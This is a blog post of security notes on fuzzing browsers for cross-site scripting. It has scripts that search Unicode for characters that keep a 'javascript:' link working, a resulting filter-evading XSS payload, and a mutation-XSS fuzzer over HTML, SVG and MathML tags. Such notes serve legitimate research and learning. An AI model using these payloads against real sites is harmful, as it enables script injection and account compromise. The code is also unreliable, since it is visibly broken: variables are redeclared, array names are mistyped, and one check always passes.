---
title: 'Javascript Fuzzing Snippets - Notes '
description: 'Book notes'
pubDate: 'nov 20 2024'
heroImage: '/yuta.jpg'
pinned: false
---

### Content breakers:

![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/contentbreaker.jpg)

```
Foreign content breakers

The following tags:
breakers = [
    "<b>", "<big>", "<blockquote>", "<body>", "<br>", "<center>", "<code>", "<dd>", "<div>",
    "<dl>", "<dt>", "<em>", "<embed>", "<h1>", "<h2>", "<h3>", "<h4>", "<h5>", "<h6>", "<head>",
    "<hr>", "<i>", "<img>", "<li>", "<listing>", "<menu>", "<meta>", "<nobr>", "<ol>", "<p>",
    "<pre>", "<ruby>", "<s>", "<small>", "<span>", "<strong>", "<strike>", "<sub>", "<sup>",
    "<table>", "<tt>", "<u>", "<ul>", "<var>"
]

<font> element
only with one of the attributes named "color", "face", or "size"
```

### `<br>` and `<p>` elements:
- Only elements which can be created from an end tag



### Fuzzing javascript scheme
- Unicode range `i=0;i<=0x10ffff`
```
log_endfuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `javascript${String.fromCodePoint(i)}:`;
    if(anchor.protocol === 'javascript:'){
        log_endfuzz.push(i)
    }

}


log_startfuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `${String.fromCodePoint(i)}javascript:`;
    if(anchor.protocol === 'javascript:'){
        log_startfuzz.push(i)
    }

}

log_middlefuzz=[];
let anchor = document.createElement('a');

for (let i=0;i<=0x10ffff;i++){
    anchor.href = `java${String.fromCodePoint(i)}script:`;
    if(anchor.protocol === 'javascript:'){
        log_middlefuzz.push(i)
    }

}

//appending to body

for (let i of log_startfuzz){
    let anchor = document.createElement('a');
    anchor.href = `${String.fromCodePoint(i)}javascript:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}


for (let i of log_middlefuz){
    let anchor = document.createElement('a');
    anchor.href = `javas${String.fromCodePoint(i)}cript:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}


for (let i of log_endfuz){
    let anchor = document.createElement('a');
    anchor.href = `javascript${String.fromCodePoint(i)}:alert(${i})`;
    anchor.append(`${i}`)
    document.body.append(anchor)
    document.body.append("    ")
}
```

- With the help of fuzzing we created a payload! `<a href="&#32;javas&#13;cript&#9;:alert()">click me</a>` which works.



### Fuzz for escapable raw text elements:
```
const tags = ["a", "abbr", "acronym", "address", "area", "article", "aside", "audio", "b", "base", "basefont", "bgsound", "bdi", "bdo", "big", "blink", "blockquote", "body", /*"br"*/, "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "content", "data", "datalist", "dd", "decorator", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "fieldset", "figcaption", "figure", "font", "footer", "form", "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hgroup", "hr", "html", "i", "img", "input", "ins", "kbd", "label", "legend", "li", "main", "map", "mark", "marquee", "menu", "menuitem", "meter", "nav", "nobr", "ol", "optgroup", "option", "output", "p", "picture", "pre", "progress", "q", "rp", "rt", "ruby", "s", "samp", "section", "select", "shadow", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "svg", "altglyph", "altglyphdef", "altglyphitem", "animatecolor", "animatemotion", "animatetransform", "circle", "clippath", "defs", "desc", "ellipse", "filter", "g", "glyph", "glyphref", "hkern", "image", "line", "lineargradient", "marker", "mask", "metadata", "mpath", "path", "pattern", "polygon", "polyline", "radialgradient", "rect", "stop", "switch", "symbol", "text", "textpath", "title", "tref", "tspan", "view", "vkern", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite", "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDistantLight", "feDropShadow", "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur", "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset", "fePointLight", "feSpecularLighting", "feSpotLight", "feTile", "feTurbulence", "animate", "color-profile", "cursor", "discard", "font-face", "font-face-format", "font-face-name", "font-face-src", "font-face-uri", "foreignobject", "hatch", "hatchpath", "mesh", "meshgradient", "meshpatch", "meshrow", "missing-glyph", "script", "set", "solidcolor", "unknown", "use", "math", "menclose", "merror", "mfenced", "mfrac", "mglyph", "mi", "mlabeledtr", "mmultiscripts", "mn", "mo", "mover", "mpadded", "mphantom", "mroot", "mrow", "ms", "mspace", "msqrt", "mstyle", "msub", "msup", "msubsup", "mtable", "mtd", "mtext", "mtr", "munder", "munderover", "mprescripts", "maction", "maligngroup", "malignmark", "mlongdiv", "mscarries", "mscarry", "msgroup", "mstack", "msline", "msrow", "semantics", "annotation", "annotation-xml", "none", "#text", "a2", "applet", "audio2", "command", "custom tags", "embed", "frame", "frameset", "iframe", "iframe2", "input2", "input3", "input4", "keygen", "link", "listing", "meta", "multicol", "nextid", "noembed", "noframes", "noscript", "object", "param", "plaintext", "rb", "rtc", "slot", "video2", "xmp"]

var parse = (str) => (new DOMParser).parseFromString(str, "text/html").documentElement.innerHTML;
log = []
for (let tag of tags){
    fuzz = `<${tag}><p is="</${tag}><img src='1'>"></${tag}`
    document.body.innerHTML=(parse(fuzz))
    if(document.body.getElementsByTagName('img')){
        log.push(tag)}

}

```

